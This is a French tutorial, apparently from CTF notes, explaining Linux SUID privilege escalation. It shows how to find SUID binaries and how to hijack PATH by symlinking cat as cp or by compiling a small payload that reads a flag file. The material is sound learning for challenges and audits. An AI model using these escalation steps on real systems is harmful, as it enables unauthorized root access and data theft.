# Challenges
## Overview

# SUID Shell script, programmes SUID

L'une des premières choses qu'on peut chercher à savoir durant un audit, c'est si un programme peut-etre exécuté par n'importe quel utilisateur avec les permissions d'un autre.

Des scripts, comme linpeas.sh font ce travail pour nous. Cependant, dans le cadre de challenges, de ctf etc. il peut-^etre intéressant de savoir comment cela fonctionne.

Pour trouver des programmes avec un SUID (Set User ID), il suffit de faire une recherche avec find :

```sh
    find / -perm -u=s -type f
```

En général, de très simple challenges proposent un programme avec un SUID, et le code source. Par exemple, un programme peut faire un truc bidon sur un fichier (au hasard le flag qu'on doit choper), et charge à nous d'utiliser cette faiblesse organisée afin de la tourner à notre avantage.

[Un lien](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/) explique le fonctionnement de base de cet tye de vulnérabilité.

Admettons qu'un programme avec SETUID fasse quelque chose sur un fichier. Il utilise par exemple
```C
system(cp /home/michel/flag.txt /root/supersecret);
```
Ce programme - appelons-le supercopy -, a comme permissions (ici c'est une permission root, au lieu de lire le fichier on pourrait avoir un shell root) :

```sh
-rwsr-xr-x root root ...
```

On peut faire en sorte qu'au lieu que ce soit cp qui soit invoqué, ce soit un autre programme.

Plusieurs moyens existent :

 - Faire un lien symbolique de cat avec le nom de cp
 ```sh
    ln -s /bin/cat /tmp/cp
    export PATH=/tmp:$PATH
    ./supercopy
    $ : flag...
 ```
 Ici, on exploite le fait que le chemin absolu vers cp n'est pas noté, et que seul le chemin relatif est donc utilisé. C'est une technique toute b^ete, que nous allons utiliser tout le temps dans le cadre de ces petit exemple.
 - On peut écrire nous m^eme un programme (dans tmp par ex, car tout le monde peut écrire dans ce dossier en général) pour invoquer cat :
   ```C
    int main(void)
    {
        system("/bin/cat /home/michel/flag.txt");
        return 0;
    }
    ```

    ```sh
        gcc payload.c -o cp
        export PATH=/tmp
        ./supercopy
        $ : flag...
    ```
